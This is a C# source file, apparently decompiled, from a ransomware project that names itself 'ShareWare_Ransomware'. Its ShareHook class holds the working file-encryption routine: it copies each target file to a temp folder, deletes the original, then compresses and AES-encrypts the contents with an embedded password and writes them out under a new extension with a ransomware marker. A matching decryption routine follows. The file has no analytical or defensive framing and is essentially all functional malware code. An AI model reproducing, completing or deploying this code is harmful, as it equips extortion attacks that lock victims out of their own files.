using System;
using System.IO;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Shareware.My;

namespace Shareware.Shareware.core;

public class ShareHook
{
	public UFuncs UFuncsEx;

	public ShareHook()
	{
		UFuncsEx = new UFuncs();
	}

	public bool Encriptor(string FileE)
	{
		string fileName = Path.GetFileName(FileE);
		string directoryName = Path.GetDirectoryName(FileE);
		if (File.Exists(FileE))
		{
			if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(DirPaths.TempPath + fileName))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(DirPaths.TempPath + fileName);
			}
			File.Copy(FileE, DirPaths.TempPath + fileName);
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(FileE);
			FileStream fileStream = new FileStream(DirPaths.TempPath + fileName, FileMode.Open, FileAccess.Read);
			BinaryReader binaryReader = new BinaryReader(fileStream);
			byte[] input = binaryReader.ReadBytes(checked((int)fileStream.Length));
			string input2 = Compression.CompressedData(BytesToString(input));
			Crypto crypto = new Crypto();
			string value = crypto.AES_Encrypt(input2, UFuncsEx.EncodeBase64(DirPaths.strPass));
			string text = directoryName + "\\" + fileName + DirPaths.ExtensionDefaul;
			StreamWriter streamWriter = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileWriter(text, true);
			streamWriter.WriteLine(value);
			streamWriter.WriteLine("$ShareWare_Ransomware$");
			streamWriter.WriteLine("#" + fileName);
			streamWriter.Close();
			return true;
		}
		return false;
	}

	public bool Decriptor(string FileE)
	{
		try
		{
			string fileName = Path.GetFileName(FileE);
			string directoryName = Path.GetDirectoryName(FileE);
			if (File.Exists(FileE))
			{
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(DirPaths.TempPath + fileName))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(DirPaths.TempPath + fileName);
				}
				File.Copy(FileE, DirPaths.TempPath + fileName);
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(FileE);
				string empty = string.Empty;
				string empty2 = string.Empty;
				StreamReader streamReader = ((ServerComputer)MyProject.Computer).get_FileSystem().OpenTextFileReader(DirPaths.TempPath + fileName);
				empty2 = streamReader.ReadToEnd();
				streamReader.Close();
				string[] array = empty2.Split(new char[1] { '#' });
				empty = array[1];
				empty2 = empty2.Replace("$ShareWare_Ransomware$", null);
				empty2 = empty2.Replace("#" + empty, null);
				Crypto crypto = new Crypto();
				string input = empty2;
				string compressedText = crypto.AES_Decrypt(input, UFuncsEx.EncodeBase64(DirPaths.strPass));
				string path = directoryName + "\\" + FixPath(empty);
				string kMvWYyQigLibcI = Compression.DecompressData(compressedText);
				File.WriteAllBytes(path, KHwGeygjHq(kMvWYyQigLibcI));
				if (((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(DirPaths.TempPath + fileName))
				{
					((ServerComputer)MyProject.Computer).get_FileSystem().FileExists(DirPaths.TempPath + fileName);
				}
				return true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return false;
	}

	private string FixPath(string illegal)
	{
		return string.Join("", illegal.Split(Path.GetInvalidFileNameChars()));
	}

	public byte[] KHwGeygjHq(string KMvWYyQigLibcI)
	{
		KMvWYyQigLibcI = Strings.Replace(KMvWYyQigLibcI, " ", "", 1, -1, (CompareMethod)0);
		checked
		{
			byte[] array = new byte[unchecked(Strings.Len(KMvWYyQigLibcI) / 2) - 1 + 1];
			object obj = default(object);
			object obj2 = default(object);
			if (ForLoopControl.ForLoopInitObj(obj, (object)0, (object)(Information.UBound((Array)array, 1) - 2), (object)1, ref obj2, ref obj))
			{
				do
				{
					array[Conversions.ToInteger(obj)] = (byte)Conversions.ToLong("&H" + Strings.Mid(KMvWYyQigLibcI, Conversions.ToInteger(Operators.AddObject(Operators.MultiplyObject((object)2, obj), (object)1)), 2));
				}
				while (ForLoopControl.ForNextCheckObj(obj, obj2, ref obj));
			}
			return array;
		}
	}

	public static string BytesToString(byte[] Input)
	{
		StringBuilder stringBuilder = new StringBuilder(checked(Input.Length * 2));
		foreach (byte b in Input)
		{
			string text = Conversion.Hex(b);
			if (text.Length == 1)
			{
				text = "0" + text;
			}
			stringBuilder.Append(text);
		}
		return stringBuilder.ToString();
	}

	public bool CheckForBinary(string FilePath)
	{
		Stream stream = new FileStream(FilePath, FileMode.Open, FileAccess.Read);
		bool result = true;
		checked
		{
			int num = (int)(stream.Length - 1L);
			for (int i = 0; i <= num; i++)
			{
				int num2 = stream.ReadByte();
				if (num2 >= 0 && num2 <= 127)
				{
					if (stream.Position == stream.Length)
					{
						result = false;
					}
				}
				else
				{
					result = true;
				}
			}
			stream.Dispose();
			stream.Close();
			return result;
		}
	}
}
